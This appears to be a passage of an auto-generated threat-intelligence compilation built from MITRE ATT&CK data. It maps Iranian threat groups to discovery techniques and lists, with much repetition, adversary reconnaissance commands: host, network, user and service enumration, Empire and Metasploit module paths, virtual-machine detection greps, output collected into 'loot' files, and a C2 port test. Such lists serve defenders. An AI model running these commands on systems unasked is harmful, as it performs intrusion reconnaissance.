hostname
hostname
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
powershell/situational_awareness/host/computerdetails
powershell/situational_awareness/host/computerdetails
powershell/situational_awareness/host/winenum
powershell/situational_awareness/host/winenum
powershell/situational_awareness/network/powerview/get_computer
powershell/situational_awareness/network/powerview/get_computer
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: System Information Discovery

## Technique Description

```
An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

### Windows

Example commands and utilities that obtain this information include <code>ver</code>, [Systeminfo](https://attack.mitre.org/software/S0096), and <code>dir</code> within [cmd](https://attack.mitre.org/software/S0106) for identifying information based on present files and directories.

### Mac

On Mac, the <code>systemsetup</code> command gives a detailed breakdown of the system, but it requires administrative privileges. Additionally, the <code>system_profiler</code> gives a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and many other things without needing elevated permissions.

### AWS

In Amazon Web Services (AWS), the Application Discovery Service may be used by an adversary to identify servers, virtual machines, software, and software dependencies running.(Citation: Amazon System Discovery)

### GCP

On Google Cloud Platform (GCP) <code>GET /v1beta1/{parent=organizations/*}/assets</code> or <code>POST /v1beta1/{parent=organizations/*}/assets:runDiscovery</code> may be used to list an organizations cloud assets, or perform asset discovery on a cloud environment.(Citation: Google Command Center Dashboard)

### Azure

In Azure, the API request <code>GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Compute/virtualMachines/{vmName}?api-version=2019-03-01</code> may be used to retrieve information about the model or instance view of a virtual machine.(Citation: Microsoft Virutal Machine API)
```

## Technique Commands

```
ver
shell ver
set
shell set
get_env.rb
net config workstation
net config server
shell net config workstation
shell net config server
systeminfo [/s COMPNAME] [/u DOMAIN\user] [/p password]
systemprofiler tool if no access yet (victim browses to website)
or
shell systeminfo (if you already have a beacon)
sysinfo, run winenum, get_env.rb
systeminfo
reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
systemsetup
system_profiler
ls -al /Applications
uname -a >> /tmp/loot.txt
cat /etc/lsb-release >> /tmp/loot.txt
cat /etc/redhat-release >> /tmp/loot.txt
uptime >> /tmp/loot.txt
cat /etc/issue >> /tmp/loot.txt
cat /sys/class/dmi/id/bios_version | grep -i amazon
cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"
cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"
sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"
cat /proc/scsi/scsi | grep -i "vmware\|vbox"
cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"
sudo lspci | grep -i "vmware\|virtualbox"
sudo lscpu | grep -i "Xen\|KVM\|Microsoft"
sudo lsmod | grep -i "vboxsf\|vboxguest"
sudo lsmod | grep -i "vmw_baloon\|vmxnet"
sudo lsmod | grep -i "xen-vbd\|xen-vnif"
sudo lsmod | grep -i "virtio_pci\|virtio_net"
sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
hostname
hostname
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
powershell/situational_awareness/host/computerdetails
powershell/situational_awareness/host/computerdetails
powershell/situational_awareness/host/winenum
powershell/situational_awareness/host/winenum
powershell/situational_awareness/network/powerview/get_computer
powershell/situational_awareness/network/powerview/get_computer
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: System Information Discovery

## Technique Description

```
An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

### Windows

Example commands and utilities that obtain this information include <code>ver</code>, [Systeminfo](https://attack.mitre.org/software/S0096), and <code>dir</code> within [cmd](https://attack.mitre.org/software/S0106) for identifying information based on present files and directories.

### Mac

On Mac, the <code>systemsetup</code> command gives a detailed breakdown of the system, but it requires administrative privileges. Additionally, the <code>system_profiler</code> gives a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and many other things without needing elevated permissions.

### AWS

In Amazon Web Services (AWS), the Application Discovery Service may be used by an adversary to identify servers, virtual machines, software, and software dependencies running.(Citation: Amazon System Discovery)

### GCP

On Google Cloud Platform (GCP) <code>GET /v1beta1/{parent=organizations/*}/assets</code> or <code>POST /v1beta1/{parent=organizations/*}/assets:runDiscovery</code> may be used to list an organizations cloud assets, or perform asset discovery on a cloud environment.(Citation: Google Command Center Dashboard)

### Azure

In Azure, the API request <code>GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Compute/virtualMachines/{vmName}?api-version=2019-03-01</code> may be used to retrieve information about the model or instance view of a virtual machine.(Citation: Microsoft Virutal Machine API)
```

## Technique Commands

```
ver
shell ver
set
shell set
get_env.rb
net config workstation
net config server
shell net config workstation
shell net config server
systeminfo [/s COMPNAME] [/u DOMAIN\user] [/p password]
systemprofiler tool if no access yet (victim browses to website)
or
shell systeminfo (if you already have a beacon)
sysinfo, run winenum, get_env.rb
systeminfo
reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
systemsetup
system_profiler
ls -al /Applications
uname -a >> /tmp/loot.txt
cat /etc/lsb-release >> /tmp/loot.txt
cat /etc/redhat-release >> /tmp/loot.txt
uptime >> /tmp/loot.txt
cat /etc/issue >> /tmp/loot.txt
cat /sys/class/dmi/id/bios_version | grep -i amazon
cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"
cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"
sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"
cat /proc/scsi/scsi | grep -i "vmware\|vbox"
cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"
sudo lspci | grep -i "vmware\|virtualbox"
sudo lscpu | grep -i "Xen\|KVM\|Microsoft"
sudo lsmod | grep -i "vboxsf\|vboxguest"
sudo lsmod | grep -i "vmw_baloon\|vmxnet"
sudo lsmod | grep -i "xen-vbd\|xen-vnif"
sudo lsmod | grep -i "virtio_pci\|virtio_net"
sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
hostname
hostname
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
powershell/situational_awareness/host/computerdetails
powershell/situational_awareness/host/computerdetails
powershell/situational_awareness/host/winenum
powershell/situational_awareness/host/winenum
powershell/situational_awareness/network/powerview/get_computer
powershell/situational_awareness/network/powerview/get_computer
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: System Network Configuration Discovery

## Technique Description

```
Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).

Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
```

## Technique Commands

```
ipconfig /all
shell ipconfig
ipconfig
post/windows/gather/enum_domains
arp -a
route print
shell arp -a
route
nbtstat -a {IP | COMP_NAME }
shell c:\windows\sysnative\nbstat.exe -a {IP | COMP_NAME}
ipconfig /all
netsh interface show
arp -a
nbtstat -n
net config
netsh advfirewall firewall show rule name=all
arp -a
netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c
ifconfig
ipconfig /all
net config workstation
net view /all /domain
nltest /domain_trusts
powershell/situational_awareness/host/dnsserver
powershell/situational_awareness/host/dnsserver
powershell/situational_awareness/host/get_proxy
powershell/situational_awareness/host/get_proxy
powershell/situational_awareness/network/arpscan
powershell/situational_awareness/network/arpscan
powershell/situational_awareness/network/powerview/get_subnet
powershell/situational_awareness/network/powerview/get_subnet
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: System Network Configuration Discovery

## Technique Description

```
Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).

Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
```

## Technique Commands

```
ipconfig /all
shell ipconfig
ipconfig
post/windows/gather/enum_domains
arp -a
route print
shell arp -a
route
nbtstat -a {IP | COMP_NAME }
shell c:\windows\sysnative\nbstat.exe -a {IP | COMP_NAME}
ipconfig /all
netsh interface show
arp -a
nbtstat -n
net config
netsh advfirewall firewall show rule name=all
arp -a
netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c
ifconfig
ipconfig /all
net config workstation
net view /all /domain
nltest /domain_trusts
powershell/situational_awareness/host/dnsserver
powershell/situational_awareness/host/dnsserver
powershell/situational_awareness/host/get_proxy
powershell/situational_awareness/host/get_proxy
powershell/situational_awareness/network/arpscan
powershell/situational_awareness/network/arpscan
powershell/situational_awareness/network/powerview/get_subnet
powershell/situational_awareness/network/powerview/get_subnet
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: System Network Configuration Discovery

## Technique Description

```
Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).

Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
```

## Technique Commands

```
ipconfig /all
shell ipconfig
ipconfig
post/windows/gather/enum_domains
arp -a
route print
shell arp -a
route
nbtstat -a {IP | COMP_NAME }
shell c:\windows\sysnative\nbstat.exe -a {IP | COMP_NAME}
ipconfig /all
netsh interface show
arp -a
nbtstat -n
net config
netsh advfirewall firewall show rule name=all
arp -a
netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c
ifconfig
ipconfig /all
net config workstation
net view /all /domain
nltest /domain_trusts
powershell/situational_awareness/host/dnsserver
powershell/situational_awareness/host/dnsserver
powershell/situational_awareness/host/get_proxy
powershell/situational_awareness/host/get_proxy
powershell/situational_awareness/network/arpscan
powershell/situational_awareness/network/arpscan
powershell/situational_awareness/network/powerview/get_subnet
powershell/situational_awareness/network/powerview/get_subnet
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: System Network Configuration Discovery

## Technique Description

```
Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).

Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
```

## Technique Commands

```
ipconfig /all
shell ipconfig
ipconfig
post/windows/gather/enum_domains
arp -a
route print
shell arp -a
route
nbtstat -a {IP | COMP_NAME }
shell c:\windows\sysnative\nbstat.exe -a {IP | COMP_NAME}
ipconfig /all
netsh interface show
arp -a
nbtstat -n
net config
netsh advfirewall firewall show rule name=all
arp -a
netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c
ifconfig
ipconfig /all
net config workstation
net view /all /domain
nltest /domain_trusts
powershell/situational_awareness/host/dnsserver
powershell/situational_awareness/host/dnsserver
powershell/situational_awareness/host/get_proxy
powershell/situational_awareness/host/get_proxy
powershell/situational_awareness/network/arpscan
powershell/situational_awareness/network/arpscan
powershell/situational_awareness/network/powerview/get_subnet
powershell/situational_awareness/network/powerview/get_subnet
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: System Network Connections Discovery

## Technique Description

```
Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. 

An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview)

### Windows

Utilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), "net use," and "net session" with [Net](https://attack.mitre.org/software/S0039).

### Mac and Linux 

In Mac and Linux, <code>netstat</code> and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to "net session".
```

## Technique Commands

```
netstat -ano[b]
shell c:\windows\sysnative\netstat.exe -ano[b]
post/windows/gather/tcpnetstat
net session | find / "\\"
shell net session | find / "\\"
post/windows/gather/enum_logged_on_users
netstat
net use
net sessions
Get-NetTCPConnection
netstat
who -a
powershell/situational_awareness/host/monitortcpconnections
powershell/situational_awareness/host/monitortcpconnections
powershell/situational_awareness/network/powerview/get_rdp_session
powershell/situational_awareness/network/powerview/get_rdp_session
Dos
C: \ Users \ Administrator> netstat

Active connections

Protocol local address external address status
Dos
C: \ Users \ Administrator> net use
It will record a new network connection.

List is empty.
Dos
C: \ Users \ Administrator> net session
List is empty.
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: System Owner/User Discovery

## Technique Description

```
### Windows

Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

### Mac

On Mac, the currently logged in user can be identified with <code>users</code>,<code>w</code>, and <code>who</code>.

### Linux

On Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.
```

## Technique Commands

```
whoami /all /fo list
shell whoami /all /fo list
getuid
cmd.exe /C whoami
wmic useraccount get /ALL
quser /SERVER:"computer1"
quser
qwinsta.exe" /server:computer1
qwinsta.exe
for /F "tokens=1,2" %i in ('qwinsta /server:computer1 ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
@FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
users
w
who
powershell/situational_awareness/network/bloodhound
powershell/situational_awareness/network/bloodhound
powershell/situational_awareness/network/powerview/get_session
powershell/situational_awareness/network/powerview/get_session
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: System Owner/User Discovery

## Technique Description

```
### Windows

Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

### Mac

On Mac, the currently logged in user can be identified with <code>users</code>,<code>w</code>, and <code>who</code>.

### Linux

On Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.
```

## Technique Commands

```
whoami /all /fo list
shell whoami /all /fo list
getuid
cmd.exe /C whoami
wmic useraccount get /ALL
quser /SERVER:"computer1"
quser
qwinsta.exe" /server:computer1
qwinsta.exe
for /F "tokens=1,2" %i in ('qwinsta /server:computer1 ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
@FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
users
w
who
powershell/situational_awareness/network/bloodhound
powershell/situational_awareness/network/bloodhound
powershell/situational_awareness/network/powerview/get_session
powershell/situational_awareness/network/powerview/get_session
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: System Owner/User Discovery

## Technique Description

```
### Windows

Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

### Mac

On Mac, the currently logged in user can be identified with <code>users</code>,<code>w</code>, and <code>who</code>.

### Linux

On Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.
```

## Technique Commands

```
whoami /all /fo list
shell whoami /all /fo list
getuid
cmd.exe /C whoami
wmic useraccount get /ALL
quser /SERVER:"computer1"
quser
qwinsta.exe" /server:computer1
qwinsta.exe
for /F "tokens=1,2" %i in ('qwinsta /server:computer1 ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
@FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
users
w
who
powershell/situational_awareness/network/bloodhound
powershell/situational_awareness/network/bloodhound
powershell/situational_awareness/network/powerview/get_session
powershell/situational_awareness/network/powerview/get_session
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: System Owner/User Discovery

## Technique Description

```
### Windows

Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

### Mac

On Mac, the currently logged in user can be identified with <code>users</code>,<code>w</code>, and <code>who</code>.

### Linux

On Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.
```

## Technique Commands

```
whoami /all /fo list
shell whoami /all /fo list
getuid
cmd.exe /C whoami
wmic useraccount get /ALL
quser /SERVER:"computer1"
quser
qwinsta.exe" /server:computer1
qwinsta.exe
for /F "tokens=1,2" %i in ('qwinsta /server:computer1 ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
@FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
users
w
who
powershell/situational_awareness/network/bloodhound
powershell/situational_awareness/network/bloodhound
powershell/situational_awareness/network/powerview/get_session
powershell/situational_awareness/network/powerview/get_session
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: System Service Discovery

## Technique Description

```
Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are "sc," "tasklist /svc" using [Tasklist](https://attack.mitre.org/software/S0057), and "net start" using [Net](https://attack.mitre.org/software/S0039), but adversaries may also use other tools as well. Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
```

## Technique Commands

```
tasklist.exe
sc query
sc query state= all
net.exe start >> C:\Windows\Temp\service-list.txt
Dos
C: \ Windows \ system32> sc query

SERVICE_NAME: BFE
DISPLAY_NAME: Base Filtering Engine
TYPE: 20 WIN32_SHARE_PROCESS
STATE: 4 RUNNING
(STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
WIN32_EXIT_CODE: 0 (0x0)
SERVICE_EXIT_CODE: 0 (0x0)
CHECKPOINT: 0x0
WAIT_HINT: 0x0
Dos
C: \ Windows \ system32> tasklist / svc

Image Name PID Service
========================= ======== ================= ===========================
System Idle Process 0 Temp Out
System 4 Temp Out
smss.exe 288 temporary shortage
csrss.exe 420 temporary shortage
csrss.exe 532 temporary shortage
wininit.exe 576 temporary shortage
winlogon.exe 584 temporary shortage
services.exe 664 temporary shortage
Dos
C: \ Windows \ system32> net start
It has been launched the following Windows services:

Background Tasks Infrastructure Service
Base Filtering Engine
CDPUserSvc_11e76e
Certificate Propagation
CNG Key Isolation
COM + Event System
COM + System Application
```



# Actor: Group5

## Actor Description

```
[Group5](https://attack.mitre.org/groups/G0043) is a threat group with a suspected Iranian nexus, though this attribution is not definite. The group has targeted individuals connected to the Syrian opposition via spearphishing and watering holes, normally using Syrian and Iranian themes. [Group5](https://attack.mitre.org/groups/G0043) has used two commonly available remote access tools (RATs), [njRAT](https://attack.mitre.org/software/S0385) and [NanoCore](https://attack.mitre.org/software/S0336), as well as an Android RAT, DroidJack. (Citation: Citizen Lab Group5)
```

## Actor Aliases

```
Group5
```

## Technique Name: Uncommonly Used Port

## Technique Description

```
Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.
```

## Technique Commands

```
test-netconnection -ComputerName google.com -port #{port}
test-netconnection -ComputerName google.com -port 8081
telnet google.com #{port}
